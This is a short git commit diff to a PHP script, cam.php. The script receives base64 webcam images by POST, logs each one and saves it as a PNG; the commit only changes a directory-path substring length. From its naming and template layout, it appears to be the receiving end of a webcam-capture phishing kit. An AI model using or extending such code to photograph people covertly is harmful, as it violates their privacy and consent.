1ce43a4ec1fe3b211fbbe14aff7520ccc1a75ffd
Snuking <88691120+WesleyB18@users.noreply.github.com>
2022-01-09 17:55:00 -0300

    Update cam.php

--- template/example/php/cam.php
+++ template/example/php/cam.php
@@ -3,13 +3,13 @@
 	$imageData = $_POST['img'];
 
 	if (!empty($imageData)) {
-		error_log("Photo received!".substr(getcwd(), 0, 49)."\r\n", 3, "cam.txt");
+		error_log("Photo received! Directory: ".substr(getcwd(), 0, 42)."\r\n", 3, "cam.txt");
 	}
 
 	$filteredData = substr($imageData, strpos($imageData, ",") + 1);
 	$unencodedData = base64_decode($filteredData);
 
-	$dir = substr(getcwd(), 0, 49);	
+	$dir = substr(getcwd(), 0, 42);	
 	$file = $dir.'cam'.$date.'.png';
 	file_put_contents($file, $unencodedData);
 	exit();
